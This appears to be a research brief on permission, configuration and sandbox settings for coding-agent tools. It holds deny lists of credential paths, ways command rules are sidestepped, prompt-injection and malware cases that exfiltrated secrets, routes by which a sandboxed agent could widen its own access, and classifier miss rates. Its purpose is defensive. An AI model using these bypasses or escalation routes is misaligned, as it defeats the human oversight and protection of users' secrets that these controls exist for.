# Configuration layering, permissions and sandboxing (security posture) in coding-agent harnesses

Scope: best practices for configuration scopes and a safe-but-productive permission and sandbox posture, for individuals and teams. Claude Code (CC) and OpenAI Codex are equal leads; OpenCode (OC) is a nice-to-have. Terminology follows `docs/concepts/configuration.md` and `docs/concepts/permissions-and-sandbox.md` (layer, scope, trust gate, policy layer, rule, decision, approval preset, automated reviewer, sandbox policy, writable root, read denial, network allowlist, escalation).

Evidence labels used on every finding: **[Vendor]** vendor guidance/docs, **[Empirical]** empirical study or measured data, **[Advisory]** security advisory / CVE / incident report, **[Practitioner]** practitioner or researcher opinion. Research date: 2026-10-04. Vendor docs fetched on that date reflect current versions (CC around v2.1.28x; Codex after the 0.134 profile change). Items dated 2025 are marked "(2025)" so older guidance is visible.

Note on URLs: Codex docs at `developers.openai.com/codex/...` now 308-redirect to `learn.chatgpt.com/...`; the redirected URLs are cited.

## 1. Configuration layering: what belongs in user vs project vs local vs managed scope

### Takeaway
Put personal preferences and **personal secret-protection denies** in the user layer, commit **team permissions, hooks, plugins and non-secret env** in the project layer (it only takes effect after trust), keep personal per-project overrides in CC's uncommitted local file (Codex has none; use user config or a `--profile` overlay), and reserve the policy layer (CC managed settings, Codex `requirements.toml`) for things users must not be able to weaken. Never put secrets, provider endpoints or credential helpers in committed config. Treat a repository's harness config as executable code: it has been the root cause of several CVEs in both leads.

### Cited Findings

**Scope responsibilities (CC)**
- [Vendor] CC's own scope table: User `~/.claude/settings.json` = "Personal preferences: theme, editor mode, default model, your own permission rules"; Shared project `.claude/settings.json` = "Team permissions, hooks, plugins, and the environment variables the project needs" (commit it); Project local `.claude/settings.local.json` = "Personal overrides for one project, and testing before you share"; Managed = "Security policy and compliance requirements", which nothing overrides apart from a few security-sensitive exceptions — [CC settings](https://code.claude.com/docs/en/settings)
- [Vendor] CC adds `**/.claude/settings.local.json` to the global git excludes file the first time it writes the file. A hand-created local file must be added to `.gitignore` by hand. A local file that is tracked in git, or whose `.claude` is a symlink, is treated as repository-supplied and its allow rules wait for trust — [CC settings](https://code.claude.com/docs/en/settings), [CC permissions](https://code.claude.com/docs/en/permissions)
- [Vendor] Precedence, highest first: managed > `--settings`/CLI > project local > shared project > user. A project scalar beats a user scalar. List keys such as `permissions.allow` merge. "If a tool is denied at any level, no other level can allow it" (a user deny blocks a project allow and the reverse) — [CC settings](https://code.claude.com/docs/en/settings), [CC permissions](https://code.claude.com/docs/en/permissions)
- [Vendor] Some restrictive keys are honored from lower scopes even over managed (stricter wins), e.g. `disableClaudeAiConnectors: true` from any scope, and the lowest `maxEffortLevel` cap from any scope — [CC settings, "Exceptions to managed settings precedence"](https://code.claude.com/docs/en/settings)
- [Vendor] A repository cannot start CC in `auto` or `bypassPermissions`: those `defaultMode` values in `.claude/settings.json` or `.claude/settings.local.json` are ignored. Cloud sessions also ignore `bypassPermissions`/`dontAsk` from settings files — [CC permission modes](https://code.claude.com/docs/en/permission-modes)
- [Vendor] Credential masking (`sandbox.credentials` `mask` entries, `network.tlsTerminate`, `allowPlaintextInject`) is honored only from user settings, managed settings and `--settings`, never from a repository's `.claude/settings*.json`. Since v2.1.246 project/local settings' `credentials` entries are ignored entirely. `strictAllowlist` set in a repository file has no effect. `allowAppleEvents` cannot be enabled by project settings — [CC sandboxing](https://code.claude.com/docs/en/sandboxing)
- [Vendor] `disableBypassPermissionsMode` "works from any scope. A user can set it in their own settings to lock themselves out of bypass mode" — [CC permissions](https://code.claude.com/docs/en/permissions)

**Scope responsibilities (Codex)**
- [Vendor] Project `.codex/config.toml` loads only for trusted projects; "If the project is untrusted, Codex ignores project `.codex/` layers, including `.codex/config.toml`, project-local hooks, and project-local rules". Project config cannot set `openai_base_url`, `chatgpt_base_url`, `model_provider(s)`, `notify`, `profile` and others; it cannot "redirect credentials, alter host-owned app request metadata, change provider auth, select config profiles, or run machine-local notification/telemetry commands" — [Codex advanced config](https://learn.chatgpt.com/codex/config-advanced)
- [Vendor] Profiles: `--profile <name>` loads `~/.codex/<name>.config.toml` as an overlay above the base user config. The old `[profiles.<name>]` tables no longer work (changed in 0.134.0 per local vendor notes) — [Codex advanced config](https://learn.chatgpt.com/codex/config-advanced); [local concept page](../../concepts/configuration.md)
- [Vendor] Two admin stacks: `requirements.toml` "enforces admin-controlled constraints users cannot override"; `managed_config.toml` "sets startup defaults users can modify". Requirements cover "approval policy, approvals reviewer, automatic review policy, sandbox mode, permission profiles, web search mode, managed hooks, which MCP servers users can enable, and which plugin marketplace sources they can use" — [Codex managed configuration](https://learn.chatgpt.com/codex/enterprise/managed-configuration)

**Keeping secrets out of committed config and subprocess environments**
- [Vendor] CC's `env` block passes variables to the session and subprocesses. To strip credentials from all subprocesses, set `CLAUDE_CODE_SUBPROCESS_ENV_SCRUB`. Inside the sandbox, `sandbox.credentials.envVars` with `deny` unsets variables before each sandboxed command, and `mask` swaps the value for a per-session sentinel that the proxy replaces on requests to allowed hosts — [CC sandboxing](https://code.claude.com/docs/en/sandboxing)
- [Vendor] Codex `[shell_environment_policy]`: `inherit` (`core`/`all`/`none`), `ignore_default_excludes`, `exclude`/`filters`, `set`, `include_only`. "Includes don't restore variables that were already excluded" — [Codex advanced config](https://learn.chatgpt.com/codex/config-advanced). This repo's vendor notes record `ignore_default_excludes` defaulting to `true`, so names containing KEY/SECRET/TOKEN **pass through** unless set to `false` ([local Codex config notes](../../vendors/codex/configuration.md)). Set `ignore_default_excludes = false` explicitly rather than relying on the default.
- [Vendor] Dev containers: "Avoid mounting host secrets such as `~/.ssh` or cloud credential files into the container; prefer repository-scoped or short-lived tokens". Pass cloud credentials through `containerEnv`, Codespaces secrets or workload identity — [CC devcontainer](https://code.claude.com/docs/en/devcontainer)
- [Practitioner] Trail of Bits' public CC config keeps secret-path denies and global MCP servers in the **user** layer, and keeps only project-specific MCP servers in `.mcp.json` with `enableAllProjectMcpServers: false`, because "Project `.mcp.json` files live in git, so a compromised repo could ship malicious MCP servers". API keys come from 1Password, not config files — [trailofbits/claude-code-config](https://github.com/trailofbits/claude-code-config)

**Profiles for different tasks**
- [Vendor] Codex recommended preset combinations: standard `--sandbox workspace-write --ask-for-approval on-request`; read-only `--sandbox read-only --ask-for-approval on-request`; CI `--sandbox read-only --ask-for-approval never`; auto-review `on-request` + `approvals_reviewer = "auto_review"` — [Codex agent approvals & security](https://learn.chatgpt.com/codex/agent-approvals-security)
- [Vendor] CC "Common setups" table: Manual (`default`) for sensitive work; Manual + Bash sandbox auto-allow for local iteration "without a classifier"; `plan` to explore; `auto` for hands-off work; CI with `-p --permission-mode dontAsk --allowedTools "Bash(npm test)" "Read"`; `--dangerously-skip-permissions` only with a container, VM or sandbox runtime as a non-root user — [CC permission modes](https://code.claude.com/docs/en/permission-modes)
- [Vendor] Starter settings files for common deployment scenarios are in the claude-code repo's `examples/settings` directory — [CC sandboxing](https://code.claude.com/docs/en/sandboxing) → [anthropics/claude-code examples](https://github.com/anthropics/claude-code/tree/main/examples/settings)

**Reviewing config changes**
- [Advisory] Check Point (Feb 2026): "The line between configuration and execution continues to blur, requiring us to treat project setup files with the same careful attention we apply to executable code". Recommendations: keep the tool updated, inspect `.claude/` and similar directories before opening projects, heed warnings, review configuration changes during code review — [Check Point Research](https://research.checkpoint.com/2026/rce-and-api-token-exfiltration-through-claude-code-project-files-cve-2025-59536/)
- [Vendor] CC team practice: "Share approved permission configurations through version control" and "Audit or block settings changes during sessions with `ConfigChange` hooks" — [CC security](https://code.claude.com/docs/en/security)
- [Vendor] A managed-settings file copied in by a repository Dockerfile is weak: "anyone with write access can change or remove this step. For policy that engineers cannot bypass by editing repository files, deliver managed settings through server-managed settings or your MDM" — [CC devcontainer](https://code.claude.com/docs/en/devcontainer)
- [Vendor] Reviewing `.mcp.json` is not enough: servers at other scopes, claude.ai connectors and plugins can add servers too, "so reviewing `.mcp.json` doesn't show every server a session can load" — [CC security](https://code.claude.com/docs/en/security)

### Inferences
- A workable split for both leads: **user** = secret-path read denials, destructive-command denies/asks, personal MCP servers, telemetry opt-outs, `disableBypassPermissionsMode` if you want to protect yourself; **project (committed)** = narrow allow rules for the project's own build/test commands, ask rules for `git push`/deploy, project hooks, sandbox `allowWrite`/`allowedDomains` the build needs, no secrets, no provider endpoints; **local (CC only)** = experiments before promoting to project; **policy** = sandbox required, bypass disabled, MCP allowlist, telemetry destination, secret-path denies.
- Use CODEOWNERS (or equivalent required review) on `.claude/`, `.codex/`, `.agents/`, `.mcp.json`, `AGENTS.md`/`CLAUDE.md`, `.devcontainer/` and CI workflow files. This follows from Check Point's advice and the CVE history; no vendor doc found that names CODEOWNERS explicitly.
- Because CC merges list keys across scopes, a committed project file can **add** allow rules and sandbox `allowWrite`/`allowedDomains` entries once trusted. Review trust dialogs, which list the rules being granted, rather than clicking through them.
- Codex profiles (`--profile ci`, `--profile review`) and CC `--settings <file>` are the closest equivalent "task profiles". Keep the CI profile minimal (read-only or exact allowlist, no network).

### Gaps
- No vendor doc found that prescribes CODEOWNERS or branch protection for harness config directories specifically. This is inference from the CVE history.
- Codex array-merge semantics across layers are not documented in general (per the local concept page).

## 2. Permission posture: allow/ask/deny design, least privilege, approval fatigue, dangerous modes

### Takeaway
Design rules as **deny for secrets and clearly destructive actions, ask for externally visible/irreversible actions (push, deploy, publish), narrow allow for the project's routine commands**, and nothing broad (no `Bash(*)`, no interpreter wildcards). Command-pattern rules are **guidance, not a security boundary** in either lead. Real enforcement comes from the OS sandbox and outer isolation. Approval fatigue is measured and severe (CC users approve 93% of prompts), so the safe way to cut prompts is **sandbox + auto-approve inside it**, or an automated reviewer (CC auto mode, Codex auto-review). Neither reviewer is a deterministic guarantee. Bypass/yolo modes are acceptable only inside a container/VM/sandbox runtime with restricted egress and no host secrets.

### Cited Findings

**Rule evaluation and design**
- [Vendor] CC: deny > ask > allow, first match by that order. A deny in any scope beats an allow in any scope. Managed rules cannot be overridden by CLI flags — [CC permissions](https://code.claude.com/docs/en/permissions)
- [Vendor] Codex rules (Starlark `prefix_rule(pattern, decision, justification, match, not_match)` in `rules/*.rules`): when several match, "the most restrictive decision" wins, `forbidden` > `prompt` > `allow`. Linear scripts joined with `&&`, `||`, `;`, `|` are split. Scripts with redirections, substitutions, variables, wildcards or control flow are evaluated as one invocation `["bash","-lc","<script>"]`. Rules are experimental — [Codex rules](https://learn.chatgpt.com/codex/rules)
- [Vendor] OpenCode: last matching rule wins, so put `"*"` first. Most permissions default to `allow`. `external_directory` and `doom_loop` default to `ask`. `.env` reads are blocked by default (except `.env.example`). No OS sandbox is documented — [OpenCode permissions](https://opencode.ai/docs/permissions/)
- [Vendor] CC: "Yes, and don't ask again" for Bash saves a permanent per-repository rule. File-edit approvals last until session end — [CC permissions](https://code.claude.com/docs/en/permissions)

**Why command-pattern rules are not a security boundary**
- [Vendor] CC: a Bash rule "covers the invocation Claude usually produces and isn't a security boundary around the program". `Bash(curl *)` doesn't stop `/usr/bin/curl ...` or `sh -c 'curl ...'`; `Bash(git push *)` doesn't stop `git -C . push`, `git -c push.default=current push`, `git 'push'`. "For filesystem and network enforcement that doesn't depend on the command text, use sandboxing" — [CC permissions](https://code.claude.com/docs/en/permissions)
- [Vendor] CC: argument-constraining patterns are fragile. `Bash(curl http://github.com/ *)` misses options-first, `https`, redirects and variables. The suggested alternative is to deny curl/wget and use `WebFetch(domain:...)`, paired with the sandbox network allowlist; or a PreToolUse hook. Also: "using WebFetch alone doesn't prevent network access. If Bash is allowed, Claude can still use `curl`" — [CC permissions](https://code.claude.com/docs/en/permissions)
- [Practitioner] Trail of Bits: hooks (e.g. block `rm -rf`, block push to main) are "guardrails, not walls". They are more reliable than CLAUDE.md instructions ("can be forgotten or overridden by context pressure") but not a defense against prompt injection — [trailofbits/claude-code-config](https://github.com/trailofbits/claude-code-config)
- [Advisory] (2025) CVE-2025-55284: CC before 1.0.4 auto-approved `ping`, `nslookup`, `dig` as "safe", so a prompt injection could exfiltrate secrets as DNS subdomains with no prompt. Fixed by removing them from the allowlist. Lesson: "read-only" allowlists can be exfiltration channels — [GitLab advisory](https://advisories.gitlab.com/pkg/npm/@anthropic-ai/claude-code/CVE-2025-55284/), [Embrace The Red (Aug 11, 2025)](https://embracethered.com/blog/posts/2025/claude-code-exfiltration-via-dns-requests/)

**Deny lists for secrets and destructive commands**
- [Practitioner] Trail of Bits' user-level deny list (Read/Edit): `~/.ssh/**`, `~/.gnupg/**`, `~/.aws/**`, `~/.azure/**`, `~/.kube/**`, `~/.docker/config.json`, `~/.npmrc`, `~/.npm/**`, `~/.pypirc`, `~/.gem/credentials`, `~/.git-credentials`, `~/.config/gh/**`, `~/Library/Keychains/**`, crypto-wallet app data. Edits to `~/.bashrc`, `~/.zshrc` are blocked — [trailofbits/claude-code-config](https://github.com/trailofbits/claude-code-config)
- [Vendor] CC: permission `Read(...)` denies govern the Read tool, while `sandbox.filesystem.denyRead` governs shell commands. "A `denyRead` entry doesn't stop the Read tool, and `allowedDomains` doesn't limit WebFetch". Both must be set to protect a path from both paths of access (paths and domains from permission rules are merged into the sandbox config) — [CC sandboxing](https://code.claude.com/docs/en/sandboxing)
- [Vendor] Built-in non-overridable protections: CC never auto-approves `rm`/`rmdir` on critical paths, writes to protected paths (`.git`, `.claude`, `.vscode`, `.idea`, `.husky`, shell rc files, `.mcp.json`, ...) outside bypass mode, or `requiresUserInteraction` MCP tools — [CC permission modes](https://code.claude.com/docs/en/permission-modes). Codex keeps `.git`, `.agents/`, `.codex/` read-only inside writable sandboxes — [Codex agent approvals & security](https://learn.chatgpt.com/codex/agent-approvals-security)

**Approval fatigue: data**
- [Empirical] "Claude Code users approve 93% of permission prompts" — [Anthropic engineering, auto mode (Mar 25, 2026)](https://www.anthropic.com/engineering/claude-code-auto-mode)
- [Empirical] (2025) Sandboxing "safely reduces permission prompts by 84%" in Anthropic's internal usage — [Anthropic engineering, sandboxing (Oct 20, 2025)](https://www.anthropic.com/engineering/claude-code-sandboxing)

**Reducing prompts safely: sandbox auto-allow**
- [Vendor] CC sandbox auto-allow mode: sandboxed commands run without prompts. Explicit deny rules, content-scoped ask rules (e.g. `Bash(git push *)`) and critical-path `rm` still apply. A bare `Bash` ask rule is skipped for sandboxed commands (not in plan mode). Commands outside the sandbox (via `excludedCommands` or an unsandboxed retry) go through the regular flow — [CC sandboxing](https://code.claude.com/docs/en/sandboxing)
- [Vendor] CC escape hatch: a command failing in the sandbox may be retried with `dangerouslyDisableSandbox`, which prompts in Manual/acceptEdits, goes to the classifier in auto, is denied in dontAsk and runs without a prompt in bypass. **A matching allow rule like `Bash(curl *)` also approves the unsandboxed retry.** Add an ask rule `Bash(dangerouslyDisableSandbox:true)` to force a prompt, or set `allowUnsandboxedCommands: false` ("strict sandbox mode") — [CC sandboxing](https://code.claude.com/docs/en/sandboxing)
- [Vendor] Codex `on-request` "approves actions allowed by sandbox automatically; requires approval for escalations". `granular` approval policy can select which categories prompt (sandbox approvals, rules, MCP prompts, permission requests, skill scripts). `untrusted` is deprecated: "remove from all configurations immediately" — [Codex agent approvals & security](https://learn.chatgpt.com/codex/agent-approvals-security)

**Reducing prompts: classifier/reviewer modes**
- [Vendor] CC auto mode (default starting mode in terminal/VS Code since v2.1.283): rules resolve first, then reads and working-directory edits auto-approve, then everything else goes to the classifier. On entering auto mode, broad allow rules are **dropped**: `Bash(*)`, `PowerShell(*)`, wildcarded interpreters like `Bash(python*)`, package-manager run commands, `Agent` and `Monitor` allow rules. Narrow rules like `Bash(npm test)` stay — [CC permission modes](https://code.claude.com/docs/en/permission-modes)
- [Vendor] CC auto mode blocks by default, among others: `curl | bash`, sending sensitive data externally, production deploys/migrations, force push, `git reset --hard`/`clean -fd`, `terraform destroy`, IAM/repo permission grants, merging unapproved PRs, disabling CI, printing live credentials, routing package installs around an internal registry. It trusts only the working directory and the remotes present at session start (remotes added mid-session are untrusted since v2.1.200). After 3 consecutive or 20 total blocks it falls back to prompting (not configurable) — [CC permission modes](https://code.claude.com/docs/en/permission-modes)
- [Vendor] The CC classifier sees user messages, tool calls and CLAUDE.md, but tool results are stripped, "so hostile content in a file or web page can't manipulate the classifier directly". A separate server-side probe scans incoming tool results for injection — [CC permission modes](https://code.claude.com/docs/en/permission-modes)
- [Empirical] Auto-mode classifier measured rates: real traffic n=10,000, full-pipeline false-positive rate 0.4%; real overeager actions n=52, full-pipeline **false-negative rate 17%**; synthetic exfiltration n=1,000, FNR 5.7%. Authors: "It is not a drop-in replacement for careful human review on high-stakes infrastructure" — [Anthropic engineering, auto mode](https://www.anthropic.com/engineering/claude-code-auto-mode)
- [Vendor] CC: "The classifier is a per-action control, not an isolation boundary, so an isolation boundary still adds defense in depth for unattended runs" — [CC sandbox environments](https://code.claude.com/docs/en/sandbox-environments)
- [Vendor] Codex auto-review (`approvals_reviewer = "auto_review"`) reviews only escalations that would otherwise pause for a human. It checks for exfiltration of private data/secrets and for credential probing. It fails closed; a circuit breaker trips after 3 consecutive denials or 10 within 50 reviews. Policy text: org `guardian_policy_config` in managed settings, or user `[auto_review].policy`. "It is not a deterministic security guarantee" and should "complement, not replace, good sandbox design, monitoring, and organization-specific policy" — [Codex auto-review](https://learn.chatgpt.com/codex/sandboxing/auto-review)
- [Empirical] (2025) "The Attacker Moves Second" (14 authors from OpenAI, Anthropic, Google DeepMind): adaptive attacks bypassed 12 published prompt-injection defenses with success "above 90% for most"; human red-teaming reached 100% — summarized by [Simon Willison (Nov 2, 2025)](https://simonwillison.net/2025/Nov/2/new-prompt-injection-papers/)
- [Practitioner] (2025) Willison: guardrail vendors claiming "95% attack capture" are inadequate; "in web application security, 95% is very much a failing grade" — [The lethal trifecta (Jun 16, 2025)](https://simonwillison.net/2025/Jun/16/the-lethal-trifecta/)

**Dangerous modes and when they are acceptable**
- [Vendor] CC `bypassPermissions` / `--dangerously-skip-permissions`: "Only use this mode in isolated environments like containers, VMs, or dev containers without internet access". "`bypassPermissions` offers no protection against prompt injection or unintended actions". It is refused as root/sudo on Linux/macOS (skipped inside a recognized sandbox), and refused under `--restricted` (v2.1.248+). Admins block it with `permissions.disableBypassPermissionsMode: "disable"` — [CC permission modes](https://code.claude.com/docs/en/permission-modes)
- [Vendor] CC: "Always run `--dangerously-skip-permissions` sessions inside a container, a VM, or the sandbox runtime, so that file tools, MCP servers, and hooks are also inside the boundary". The Bash sandbox alone "is not sufficient for fully unattended runs in either mode" — [CC sandbox environments](https://code.claude.com/docs/en/sandbox-environments)
- [Vendor] Codex `--dangerously-bypass-approvals-and-sandbox` (`--yolo`): "Use only in tightly controlled, trusted environments"; acceptable where Docker provides outer isolation. With `--yolo`, web search defaults to **live** results instead of cached — [Codex agent approvals & security](https://learn.chatgpt.com/codex/agent-approvals-security)
- [Practitioner] (2025) Willison names three YOLO risks: destructive commands, exfiltration of source/secrets, and using the machine as a proxy for attacks. He prefers running on "someone else's computer" (e.g. GitHub Codespaces), and scoping credentials to staging with hard budget caps (example: a dedicated Fly.io org with a $5 limit) — [Designing agentic loops (Sep 30, 2025)](https://simonwillison.net/2025/Sep/30/designing-agentic-loops/)
- [Practitioner] Trail of Bits runs CC in bypass-permissions mode by default, with the sandbox, a devcontainer or a disposable remote droplet as the actual control: "the sandbox is what keeps it from doing damage" — [trailofbits/claude-code-config](https://github.com/trailofbits/claude-code-config), [trailofbits/claude-code-devcontainer](https://github.com/trailofbits/claude-code-devcontainer)
- [Advisory] (2025) The s1ngularity/Nx npm compromise (Aug 26, 2025) invoked installed AI CLIs with `--dangerously-skip-permissions`, `--yolo`, `--trust-all-tools` to search the filesystem for secrets and wallets, then exfiltrated to public GitHub repos in victims' accounts. This is a documented case of malware weaponizing coding agents' bypass flags — [Wiz](https://wiz.io/blog/s1ngularity-supply-chain-attack), [StepSecurity](https://www.stepsecurity.io/blog/supply-chain-security-alert-popular-nx-build-system-package-compromised-with-data-stealing-malware)

### Inferences
- A minimal portable baseline: deny reads of secret paths (both permission rules and sandbox `denyRead`/credentials in CC; profile `deny` / admin `deny_read` in Codex). Ask on `git push`, publish, deploy and infra commands. Allow only exact project commands (`npm test`, `make lint`). Never allow interpreters, package-manager `run`/`exec`, `docker`, or `bash -c` broadly, because each executes arbitrary code and (in CC) also approves the unsandboxed retry.
- s1ngularity shows that `disableBypassPermissionsMode` (CC) and `allowed_approval_policies`/`allowed_sandbox_modes` (Codex requirements) matter even for individuals. Any local process can launch the CLI with the bypass flag, so the policy layer is the only place that stops it. Inference: setting the CC key in your own user settings also blocks it, since it works from any scope.
- Ask rules on content (`Bash(git push *)`) survive sandbox auto-allow and auto mode in CC, so they are the right tool for "human must see this". Deny rules are the right tool for "never". Neither stops alternative spellings, so pair them with sandbox network/write limits.
- Automated reviewers lower friction substantially but have measured double-digit miss rates on overeager actions. Use them on top of a sandbox, not instead of one.

### Gaps
- No independent (non-vendor) empirical study of approval-fatigue rates or classifier efficacy in coding agents was found. Only vendor numbers.
- Codex: what `approval_policy = "never"` does to a request that would need approval is not stated clearly in the fetched pages (also noted in the concept page).

## 3. Sandboxing: filesystem write scopes, network egress allowlists, containers/VMs, credential exposure

### Takeaway
Use **both** filesystem and network isolation. One without the other leaves an exfiltration or escalation path. The per-command OS sandbox in both leads confines shell commands only. MCP servers, hooks and (in CC) built-in file tools run outside it, so unattended or bypass runs need an outer boundary (sandbox runtime, devcontainer with egress firewall, VM, cloud session). Default sandbox **reads** cover most of the machine, including `~/.ssh` and `~/.aws`, so add read denials or credential masking explicitly. Keep egress allowlists narrow: broad domains like `github.com` are exfiltration channels, and hostname-based proxies can be domain-fronted.

### Cited Findings

**What the sandbox covers and its defaults**
- [Vendor] CC sandbox: writes allowed to cwd, per-user temp and added dirs; reads allowed to "Most of the machine, including credential files such as `~/.ssh` and `~/.aws/credentials`"; environment variables inherited "including any secrets". It covers Bash, PowerShell, Monitor and children. Read/Edit/WebFetch, MCP servers and hooks run outside it. Native Windows is unsandboxed (use WSL2) — [CC sandboxing](https://code.claude.com/docs/en/sandboxing)
- [Vendor] CC: by default, if the sandbox can't start, commands run **unsandboxed**. `failIfUnavailable: true` makes CC exit instead — [CC sandboxing](https://code.claude.com/docs/en/sandboxing)
- [Vendor] Codex modes: `read-only`; `workspace-write` (default for desktop app, CLI, IDE extension; edits within the workspace, routine commands inside the boundary); `danger-full-access`. Network requires approval by default. `sandbox_workspace_write.writable_roots` extends write scope. Linux needs `bubblewrap` (Ubuntu 24.04+ may need an AppArmor profile for unprivileged user namespaces); native Windows has its own sandbox — [Codex sandboxing](https://learn.chatgpt.com/codex/sandboxing)
- [Vendor] Codex domain filtering via the network proxy: `features.network_proxy.domains = { "api.openai.com" = "allow" }`; admin `[experimental_network]` with `managed_allowed_domains_only = true` — [Codex agent approvals & security](https://learn.chatgpt.com/codex/agent-approvals-security), [Codex managed configuration](https://learn.chatgpt.com/codex/enterprise/managed-configuration)

**Both layers are required**
- [Vendor] "Effective sandboxing requires both filesystem and network isolation. Without network isolation, a compromised agent could exfiltrate sensitive files like SSH keys. Without filesystem isolation ... a compromised agent could backdoor system resources to gain network access." Check that an `allowWrite` path, broad `allowedDomains` entry or `excludedCommands` exception "does not undo a restriction on the other side" — [CC sandboxing](https://code.claude.com/docs/en/sandboxing); (2025) same point in [Anthropic engineering, sandboxing](https://www.anthropic.com/engineering/claude-code-sandboxing)
- [Vendor] With filesystem isolation off and auto-allow on, a sandboxed command "can write files that later commands run or read, such as shell startup files, executables on `$PATH`, or `~/.claude/settings.json`, and use them to widen its own access on the next run" — [CC sandboxing](https://code.claude.com/docs/en/sandboxing)

**Filesystem write scopes**
- [Vendor] Prefer `sandbox.filesystem.allowWrite` for specific paths (e.g. `~/.kube`) over `excludedCommands`. "An excluded command runs with your full access". A pattern covering an interpreter, a script in the workspace, or a tool that reads a workspace file (e.g. `docker compose`) lets Claude write that file and run it outside the sandbox — [CC sandboxing](https://code.claude.com/docs/en/sandboxing)
- [Vendor] Security limitations: allowing writes to `$PATH` directories, system config dirs or `.bashrc`/`.zshrc` enables privilege escalation. `allowUnixSockets` for `/var/run/docker.sock` "effectively grants access to the host system". `enableWeakerNestedSandbox` (for unprivileged Docker) "considerably weakens security and should only be used when additional isolation is otherwise enforced". `allowAppleEvents` removes code-execution isolation on macOS — [CC sandboxing](https://code.claude.com/docs/en/sandboxing)
- [Vendor] Protected paths inside writable roots cannot be exempted by `allowWrite` or `Edit` allow rules. A command that could edit them "could grant itself permissions, or add a hook or MCP server that Claude Code runs outside the sandbox" — [CC sandboxing](https://code.claude.com/docs/en/sandboxing)
- [Vendor] Read lockdown: `"denyRead": ["~/"]` with `allowRead` for the project (narrower path wins; a deny inside a wider allow holds), or `permissions.blockReadsOutsideWorkingDirectories` — [CC sandboxing](https://code.claude.com/docs/en/sandboxing)

**Network egress allowlists**
- [Vendor] CC: allowed domains start empty. "Yes, and don't ask again" saves a `WebFetch(domain:...)` rule to local settings. `strictAllowlist: true` (user/managed/`--settings` only, v2.1.219+) denies instead of prompting. Managed `allowManagedDomainsOnly` honors only managed domains — [CC sandboxing](https://code.claude.com/docs/en/sandboxing)
- [Vendor] "Allowing broad domains such as `github.com` can create paths for data exfiltration. Because the proxy makes its allow decision from the client-supplied hostname without inspecting TLS, code running inside the sandbox can potentially use domain fronting ... If your threat model requires stronger guarantees, configure a custom proxy that terminates TLS and inspects traffic" — [CC sandboxing](https://code.claude.com/docs/en/sandboxing)
- [Vendor] Once a custom `httpProxyPort`/`socksProxyPort` is set, CC's own domain controls stop applying to that traffic; the custom proxy must filter everything — [CC sandboxing](https://code.claude.com/docs/en/sandboxing)
- [Vendor] Codex cloud (legacy) internet access: risks are prompt injection (e.g. an issue description instructing the agent to leak data), exfiltration, malware/vulnerable deps, license issues. Recommended: allow only necessary domains (or the "Common dependencies" preset) and restrict HTTP methods to `GET`, `HEAD`, `OPTIONS`. Setup scripts keep internet access regardless; restrictions apply to the agent phase — [Codex cloud internet access](https://learn.chatgpt.com/codex/cloud/internet-access)
- [Vendor] Codex web search: `cached` (default, OpenAI-maintained index, "reduces injection exposure"), `live`, `disabled`. "Treat web results as untrusted" — [Codex agent approvals & security](https://learn.chatgpt.com/codex/agent-approvals-security)

**Containers, devcontainers, VMs**
- [Vendor] CC's isolation ladder: sandboxed Bash tool (shell only) → sandbox runtime `@anthropic-ai/sandbox-runtime` (whole process incl. file tools, MCP, hooks; beta) → dev container → custom container → VM (strongest; "evaluating untrusted code") → cloud session. Choice by goal: fewer prompts locally → Bash sandbox; unattended bypass/auto → devcontainer/container/VM/sandbox runtime; untrusted repo → dedicated VM or cloud session — [CC sandbox environments](https://code.claude.com/docs/en/sandbox-environments)
- [Vendor] "Any approach that allows network egress can still leak data the agent can read, and any approach that mounts your project directory writable can still modify that code". Isolation "does not change what is sent to the model" — [CC sandbox environments](https://code.claude.com/docs/en/sandbox-environments)
- [Vendor] Sandbox runtime caveats: without a settings file it starts anyway with built-in defaults ("Don't take a clean start as proof your settings loaded"). On Linux the protected-path deny list is built once at launch, so it doesn't cover repos created later. Add `denyWrite` for other config paths, or the session "can persist hooks, permission rules, or MCP servers that run unsandboxed the next time" — [CC sandbox environments](https://code.claude.com/docs/en/sandbox-environments)
- [Vendor] Reference devcontainer: default-deny `init-firewall.sh` (needs `NET_ADMIN`/`NET_RAW`), non-root user. "When executed with `--dangerously-skip-permissions`, dev containers do not prevent a malicious project from exfiltrating anything accessible inside the container, including the Claude Code credentials stored in `~/.claude`. Only use dev containers when developing with trusted repositories". Edits in the bind-mounted workspace appear on the host — [CC devcontainer](https://code.claude.com/docs/en/devcontainer)
- [Vendor] Org enforcement: only the built-in Bash sandbox is enforced by CC itself (managed `sandbox.enabled`, `failIfUnavailable`, `allowUnsandboxedCommands: false`). Devcontainers are "a convention rather than an enforcement boundary"; containers/VMs need device management or software allowlisting — [CC sandbox environments](https://code.claude.com/docs/en/sandbox-environments)
- [Vendor] Docker Sandboxes (microVM with own Docker daemon) is listed by Anthropic as a VM option — [CC sandbox environments](https://code.claude.com/docs/en/sandbox-environments), [Docker Sandboxes](https://docs.docker.com/ai/sandboxes/)

**Credential exposure**
- [Vendor] CC `sandbox.credentials`: `deny` blocks files and unsets env vars for sandboxed commands; `mask` gives sandboxed commands a sentinel that the proxy replaces with the real value only on requests to allowed hosts. Masking needs `network.tlsTerminate`; `claude doctor` warns when TLS termination is unavailable. AWS key pairs must be masked together (SigV4 re-signing). An unmatched `extract` pattern defaults to `warn` and leaves the file **readable unmasked**; use `deny` if the secret may be present — [CC sandboxing](https://code.claude.com/docs/en/sandboxing)
- [Vendor] Cloud sessions keep GitHub credentials out of the VM: the VM gets a short-lived scoped credential, and a proxy attaches the real one and rejects branch deletions and tag pushes. Branch protection still decides what can be pushed — [CC security](https://code.claude.com/docs/en/security)
- [Vendor] Codex `shell_environment_policy` filters secrets from spawned commands (see section 1 conflict note) — [Codex advanced config](https://learn.chatgpt.com/codex/config-advanced)
- [Advisory] (2025) CVE-2025-59532: Codex CLI 0.2.0–0.38.0 could treat a **model-generated cwd** as the sandbox writable root, allowing writes outside the session folder. Fixed in 0.39.0 (IDE extension 0.4.12) by canonicalizing the boundary to where the user started — [NVD](https://nvd.nist.gov/vuln/detail/CVE-2025-59532), [GitLab advisory](https://advisories.gitlab.com/pkg/npm/@openai/codex/CVE-2025-59532/)

### Inferences
- Individual default for both leads: workspace-write sandbox, network off or proxied to a short allowlist of package registries (no broad `github.com` unless pushes go through a narrower path), secret-path read denials, secrets filtered from the subprocess env. For bypass/yolo, add an outer container/VM with a default-deny egress firewall, no mounted host credentials, short-lived scoped tokens and budget-capped accounts.
- `excludedCommands` and `allowUnixSockets` are the most common ways to quietly undo the sandbox (Docker socket, interpreters, `docker compose`). Review them like `sudo` grants.
